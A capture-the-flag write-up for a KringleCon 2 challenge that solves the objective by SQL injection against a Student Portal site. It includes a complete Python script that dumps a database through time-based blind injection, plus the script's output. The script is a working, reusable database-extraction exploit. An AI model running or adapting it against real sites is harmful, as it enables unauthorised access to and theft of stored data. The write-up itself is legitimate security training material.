# 1. Primary Objectives
## 1.9. Retrieve Scraps of Paper from Server
### 1.9.1. Description
Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.
### 1.9.2. Solution
I tried SQL injection attacks with success on this website and started digging further.

I tried registering an already confirmed user by injecting the sing in form but it didn’t led to the solution as a message stating that the flag was somewhere else in the DB.
At the time of writing I tried replicating the error without success, instead receiving the following:
```sql
Error: INSERT INTO applications (name, elfmail, program, phone, whyme, essay, status) VALUES ('asdasd', 'asd', 'asd', 'asd', 'asd', 'asd', ''); #', 'asdasd@gmail.com', 'asd', 'asd', 'asd', 'asd', 'pending')
The table 'applications' is full
```

Having an easily customizable script developed during another challenge able to download the entire database I decided to set it up for this website. The script was developed for time-based blind SQLi attacks with hex encoded payloads even though in this challenge there it was possible to leverage different messages on the Check Application Status form but that would require some more coding and laziness prevailed.

With the script I retrieved below three tables:
```
Schema elfu Table #0 has name applications [hex 6170706c69636174696f6e73]
Schema elfu Table #1 has name krampus [hex 6b72616d707573]
Schema elfu Table #2 has name students [hex 73747564656e7473]
```

I decided to focus on the Krampus table retrieving below data from it:
| id | path |
| ------------ | ------------- |
| 1 | /krampus/0f5f510e.png |
| 2 | /krampus/1cc7e121.png |
| 3 | /krampus/439f15e6.png |
| 4 | /krampus/667d6896.png |
| 5 | /krampus/adb798ca.png |
| 6 | /krampus/ba417715.png |

Downloading png files from https://studentportal.elfu.org/$PATH I got 6 scrap paper images from where it was possible to get the flag.
### 1.9.3. Flag
The flag is: ​**Sled-o-matic​**.
### 1.9.4. Attachments
#### 1.9.4.1. students.py
```python
import requests
import logging
import traceback
import inspect
import httplib
import urllib
import md5
import sys

'''
def patch_send():
    old_send= httplib.HTTPConnection.send
    def new_send( self, data ):
        print data
        return old_send(self, data) #return is not necessary, but never hurts, in case the library is changed
    httplib.HTTPConnection.send= new_send

patch_send()
'''

INT_TYPES = ['INT', 'TINYINT', 'SMALLINT', 'MEDIUMINT', 'BIGINT']
FLOAT_TYPES = ['FLOAT']
DOUBLE_TYPES = ['DOUBLE', 'DECIMAL']
STRING_TYPES = ['VARCHAR', 'DATE', 'DATETIME', 'TIMESTAMP', 'TIME', 'YEAR', 'CHAR', 'BLOB', 'TINYBLOB', 'MEDIUMBLOB', 'LONGBLOB', 'ENUM']

def buildBlind (baseQuery, ifPayload, equalPayload, sleepTime):
    select_skel = "IF(({})={}, SLEEP({}), NULL)"

    if isinstance(equalPayload, str):
        equalPayload = "\'{}\'".format(equalPayload)

    select = select_skel.format(ifPayload, equalPayload, sleepTime)

    injection = baseQuery.format(select)
    #print "Injection payload {}".format(injection)

    return injection

def sendRequest (baseUrl):
    response = None
    try:
        response = requests.get(baseUrl)
    except Exception as e:
        # Resend and hope
        print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
        print "!!!!!! RESEND AND HOPE !!!!!!"
        print " ! Excpetion: {} !".format(e)
        print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
        response = sendRequest(baseUrl)
    return response

def runBlind (baseUrl, sqli, sleepTime):
    token = requests.get('https://studentportal.elfu.org/validator.php').text

    sys.stderr.write(sqli + "\n")

    baseUrl = baseUrl.format(urllib.quote(sqli), token)

    response = sendRequest(baseUrl)

    elapsed = response.elapsed.seconds
    #print response.content
    #print "Query took {} seconds".format(elapsed)

    if elapsed >= sleepTime:
        return True
    else:
        return False

def baseEqualBlind (baseUrl, baseQuery, queryPayload, equalPayload, sleepTime):
    sqli = buildBlind(baseQuery, queryPayload, equalPayload, sleepTime)

    blindResult = runBlind(baseUrl, sqli, sleepTime)

    if blindResult:
        blindResult = runBlind (baseUrl, sqli, sleepTime)
        if blindResult:
            return True
    return False        

def baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime):
    counter = 0
    length = None

    while counter != length:
        sqli = buildBlind(baseQuery, queryPayload, counter, sleepTime)

        blindResult = runBlind(baseUrl, sqli, sleepTime)

        if blindResult:
            blindResult = runBlind (baseUrl, sqli, sleepTime)
            if blindResult:
                length = counter
        else:
            counter += 1

    return length

def baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime):
    hexAlphabeth = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"]
    counter = 0
    length = None

    for hexChar in hexAlphabeth:
        sqli = buildBlind(baseQuery, queryPayload, hexChar, sleepTime)

        blindResult = runBlind(baseUrl, sqli, sleepTime)
        if blindResult:
            blindResult = runBlind (baseUrl, sqli, sleepTime)
            if blindResult:
                return hexChar

    # Recheck and hope
    print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    print "!!!!!! RECHECK AND HOPE !!!!!!"
    print " ! Result not in alphabeth !"
    print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    return baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime):
    result = baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime)
    #if result % 2 != 0:
        # Recheck and hope
        #print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
        #print "!!!!!! RECHECK AND HOPE !!!!!!"
        #print "  !! result {} is not odd !!"
        #print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
        #result = hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)
    return result

def getSchemaNameLength (baseUrl, baseQuery, sleepTime):
    queryPayload = "CHAR_LENGTH(HEX(database()))"
    return hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getSchemaName (baseUrl, baseQuery, schemaNameLength, sleepTime):
    schemaName = ""
    for i in range(1, schemaNameLength + 1):
        queryPayload = "LOWER(SUBSTRING(HEX(database()),{},1))".format(i)
        schemaNameChar = baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime)
        schemaName += schemaNameChar
        #print schemaNameChar, 

    return schemaName

def getSchema (baseUrl, baseQuery, sleepTime):
    schemaNameLength = getSchemaNameLength (baseUrl, baseQuery, sleepTime)
    print "Schema has a {} char long hex encoded name".format(schemaNameLength)

    schemaName = getSchemaName(baseUrl, baseQuery, schemaNameLength, sleepTime)
    schemaNameDecoded = schemaName.decode("hex")
    print "Schema has name {} [hex {}]".format(schemaNameDecoded, schemaName)

    return schemaNameDecoded

def getTableNameLength (baseUrl, baseQuery, tableSchema, tableNumber, sleepTime):
    queryPayload = "SELECT CHAR_LENGTH(HEX(table_name)) FROM information_schema.tables WHERE table_schema = '{}' LIMIT {}, 1".format(tableSchema, tableNumber)
    return hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getNumberOfTables (baseUrl, baseQuery, tableSchema, sleepTime):
    queryPayload = "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '{}'".format(tableSchema)
    return baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime)   

def getTableName (baseUrl, baseQuery, tableSchema, tableNumber, tableNameLength, sleepTime):
    tableName = ""
    for i in range(1, tableNameLength + 1):
        queryPayload = "SELECT LOWER(SUBSTRING(HEX(table_name),{},1)) FROM information_schema.tables WHERE table_schema = '{}' LIMIT {}, 1".format(i, tableSchema, tableNumber)
        tableNameChar = baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime)
        tableName += tableNameChar
        #print tableNameChar, 

    return tableName

def getNumberOfColumns (baseUrl, baseQuery, tableSchema, tableName, sleepTime):
    queryPayload = "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = '{}' AND table_name='{}'".format(tableSchema, tableName)
    return baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime)   

def getColumnNameLength (baseUrl, baseQuery, tableSchema, tableName, columnNumber, sleepTime):
    queryPayload = "SELECT CHAR_LENGTH(HEX(column_name)) FROM information_schema.columns WHERE table_schema = '{}' AND table_name='{}' LIMIT {}, 1".format(tableSchema, tableName, columnNumber)
    return hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getColumnName (baseUrl, baseQuery, tableSchema, tableName, columnNumber, columnNameLength, sleepTime):
    columnName = ""
    for i in range(1, columnNameLength + 1):
        queryPayload = "SELECT LOWER(SUBSTRING(HEX(column_name),{},1)) FROM information_schema.columns WHERE table_schema = '{}' AND table_name='{}' LIMIT {}, 1".format(i, tableSchema, tableName, columnNumber)
        columnNameChar = baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime)
        columnName += columnNameChar
        #print columnNameChar

    return columnName

def getTables (baseUrl, baseQuery, tableSchema, sleepTime):
    tables = []
    number_of_tables = getNumberOfTables(baseUrl, baseQuery, tableSchema, sleepTime)

    print "Table Schema {} has {} tables".format(tableSchema, number_of_tables)

    for tableNumber in range(number_of_tables):
        tableNameLength = getTableNameLength (baseUrl, baseQuery, tableSchema, tableNumber, sleepTime)
        print "Table Schema {} Table #{} has a {} char long hex encoded name".format(tableSchema, tableNumber, tableNameLength)

        tableName = getTableName(baseUrl, baseQuery, tableSchema, tableNumber, tableNameLength, sleepTime)
        tableNameDecoded = tableName.decode("hex")
        print "Table Schema {} Table #{} has name {} [hex {}]".format(tableSchema, tableNumber, tableNameDecoded, tableName)

        tables.append(tableNameDecoded);

    return tables

def getColumnType (baseUrl, baseQuery, tableName, columnName, sleepTime):
    types = INT_TYPES + FLOAT_TYPES + DOUBLE_TYPES + STRING_TYPES

    for t in types:
        queryPayload = "SELECT UPPER(DATA_TYPE) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{}' AND COLUMN_NAME = '{}'".format(tableName, columnName)
        if baseEqualBlind (baseUrl, baseQuery, queryPayload, t, sleepTime):
            return t


def getColumns (baseUrl, baseQuery, tableSchema, tableName, sleepTime):
    columns = []
    number_of_columns = getNumberOfColumns(baseUrl, baseQuery, tableSchema, tableName, sleepTime)

    print "Table Schema {} Table {} has {} columns".format(tableSchema, tableName, number_of_columns)

    for columnNumber in range(number_of_columns):
        columnNameLength = getColumnNameLength (baseUrl, baseQuery, tableSchema, tableName, columnNumber, sleepTime)
        print "Table Schema {} Table {} column #{} has a {} char long hex encoded name".format(tableSchema, tableName, columnNumber, columnNameLength)

        columnName = getColumnName(baseUrl, baseQuery, tableSchema, tableName, columnNumber, columnNameLength, sleepTime)
        columnNameDecoded = columnName.decode("hex")
        print "Table Schema {} Table {} column #{} has name {} [hex {}]".format(tableSchema, tableName, columnNumber, columnNameDecoded, columnName)

        columnType = getColumnType(baseUrl, baseQuery, tableName, columnNameDecoded, sleepTime)
        print "Table Schema {} Table {} column {} has type {}".format(tableSchema, tableName, columnNameDecoded, columnType)        

        columns.append({'columnName':columnNameDecoded, 'columnType': columnType});

    return columns

def getNumberOfRows (baseUrl, baseQuery, tableName, sleepTime):
    queryPayload = "SELECT COUNT(*) FROM {}".format(tableName)
    return baseIntBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getDataLength (baseUrl, baseQuery, tableName, columnName, rowNumber, sleepTime):
    queryPayload = "SELECT CHAR_LENGTH(HEX({})) FROM {} LIMIT {},1".format(columnName, tableName, rowNumber)
    return hexLengthBlind (baseUrl, baseQuery, queryPayload, sleepTime)

def getDataContent (baseUrl, baseQuery, tableName, columnName, rowNumber, dataLength, sleepTime):
    content = ""
    for i in range(1, dataLength + 1):
        queryPayload = "SELECT LOWER(SUBSTRING(HEX({}),{},1)) FROM {} LIMIT {}, 1".format(columnName, i, tableName, rowNumber)
        contentChar = baseHexBlind (baseUrl, baseQuery, queryPayload, sleepTime)
        content += contentChar
        #print contentChar,

    return content

def getRows (baseUrl, baseQuery, tableName, columns, sleepTime):
    number_of_rows = getNumberOfRows(baseUrl, baseQuery, tableName, sleepTime)
    print "Table {} has {} rows".format(tableName, number_of_rows)

    for i in range(0, number_of_rows):
        row = []
        for column in columns:
            data_length = getDataLength(baseUrl, baseQuery, tableName, column['columnName'], i, sleepTime)
            print "Table {} column {} row #{} data has hex encoded length {}".format(tableName, column['columnName'], i, data_length)

            data_content = getDataContent(baseUrl, baseQuery, tableName, column['columnName'], i, data_length, sleepTime)

            if column['columnType'] in INT_TYPES:
                decoded_data_content = int(data_content, 0)
            elif column['columnType'] in FLOAT_TYPES:
                decoded_data_content = float(data_content, 0)
            elif column['columnType'] in DOUBLE_TYPES:
                decoded_data_content = double(data_content, 0)
            else: # Everything else fallbacks as STRING_TYPES
                decoded_data_content = data_content.decode('hex')

            print "Table {} column {} row#{} content is {} [hex {}]".format(tableName, column, i, decoded_data_content, data_content)
            row.append(decoded_data_content)

        print "Table {} row#{} has content {}".format(tableName, i, row)

def main ():
    baseUrl  = "https://studentportal.elfu.org/application-check.php?elfmail={}&token={}"
    baseQuery = "' UNION SELECT {}; #"
    sleepTime = 3

    print "### Setup ###"
    print "Base URL                 : {}".format(baseUrl.format("PAYLOAD", "TOKEN"))
    print "Base Query               : {}".format(baseQuery.format("QUERY_PAYLOAD"))
    print "Sleep Time               : {}".format(sleepTime)
    print "### Run ###"

    #tableSchema = getSchema (baseUrl, baseQuery, sleepTime)
    tableSchema = "elfu"
    #tables = getTables (baseUrl, baseQuery, tableSchema, sleepTime)
    tables = ["krampus"]

    for table in tables:
        #columns = getColumns (baseUrl, baseQuery, tableSchema, table, sleepTime)
        columns = [{'columnName': 'id', 'columnType': 'INT'}, {'columnName': 'path', 'columnType': 'VARCHAR'}]
        print "Table Schema {} Table {} Columns {}".format(tableSchema, table, columns)

        getRows (baseUrl, baseQuery, table, columns, sleepTime)

if __name__ == "__main__":
    main()
```
#### 1.9.4.2. students.py sample output
```
### Setup ###
Base URL                 : https://studentportal.elfu.org/application-check.php?elfmail=PAYLOAD&token=TOKEN
Base Query               : ' UNION SELECT QUERY_PAYLOAD; #
Sleep Time               : 3
### Run ###
Table Schema elfu Table krampus Columns [{'columnName': 'id', 'columnType': 'INT'}, {'columnName': 'path', 'columnType': 'VARCHAR'}]
Table krampus has 6 rows
Table krampus column id row #0 data has hex encoded length 1
Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#0 content is 1 [hex 1]
Table krampus column path row #0 data has hex encoded length 42
Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#0 content is /krampus/0f5f510e.png [hex 2f6b72616d7075732f30663566353130652e706e67]
Table krampus row#0 has content [1, '/krampus/0f5f510e.png']
Table krampus column id row #1 data has hex encoded length 1
Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#1 content is 2 [hex 2]
Table krampus column path row #1 data has hex encoded length 42
Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#1 content is /krampus/1cc7e121.png [hex 2f6b72616d7075732f31636337653132312e706e67]
Table krampus row#1 has content [2, '/krampus/1cc7e121.png']
Table krampus column id row #2 data has hex encoded length 1
Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#2 content is 3 [hex 3]
Table krampus column path row #2 data has hex encoded length 42
Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#2 content is /krampus/439f15e6.png [hex 2f6b72616d7075732f34333966313565362e706e67]
Table krampus row#2 has content [3, '/krampus/439f15e6.png']
Table krampus column id row #3 data has hex encoded length 1
Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#3 content is 4 [hex 4]
Table krampus column path row #3 data has hex encoded length 42
Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#3 content is /krampus/667d6896.png [hex 2f6b72616d7075732f36363764363839362e706e67]
Table krampus row#3 has content [4, '/krampus/667d6896.png']
Table krampus column id row #4 data has hex encoded length 1
Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#4 content is 5 [hex 5]
Table krampus column path row #4 data has hex encoded length 42
Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#4 content is /krampus/adb798ca.png [hex 2f6b72616d7075732f61646237393863612e706e67]
Table krampus row#4 has content [5, '/krampus/adb798ca.png']
Table krampus column id row #5 data has hex encoded length 1
Table krampus column {'columnName': 'id', 'columnType': 'INT'} row#5 content is 6 [hex 6]
Table krampus column path row #5 data has hex encoded length 42
Table krampus column {'columnName': 'path', 'columnType': 'VARCHAR'} row#5 content is /krampus/ba417715.png [hex 2f6b72616d7075732f62613431373731352e706e67]
Table krampus row#5 has content [6, '/krampus/ba417715.png']
```
#### 1.9.4.3. Recovered scrap papers
![Recovered scrap papers](https://github.com/LamonatoAndrea/KringleCon2/blob/master/01%20-%20Primary%20Objectives/09%20-%20Retrieve%20Scraps%20of%20Paper%20from%20Server/RecoveredScrapPapers.png)